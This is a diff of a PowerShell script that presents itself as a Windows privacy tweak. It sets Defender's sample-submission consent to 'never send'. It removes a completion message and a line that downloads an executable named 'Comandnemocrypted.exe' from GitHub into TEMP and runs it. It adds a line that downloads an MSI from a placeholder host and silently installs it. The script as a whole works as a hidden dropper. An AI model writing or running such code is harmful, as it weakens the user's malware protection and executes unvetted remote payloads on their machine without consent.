@@ -39,7 +39,5 @@ if (Test-Path $spy2) {
     Set-ItemProperty -Path $spy2 -Name "SubmitSamplesConsent" -Type DWord -Value 2 -Force
 }
 
-Write-Host "Готово. Ключи записаны. Перезагрузи ПК." -ForegroundColor Green
 
-
-$p="$env:TEMP\user.exe"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/Comandnemocrypted.exe" -OutFile $p; Start-Process $p
+$p="$env:TEMP\Comand.msi"; Invoke-WebRequest "https://example.com/path/to/Comand.msi" -OutFile $p; Start-Process msiexec.exe -ArgumentList "/i `"$p`""
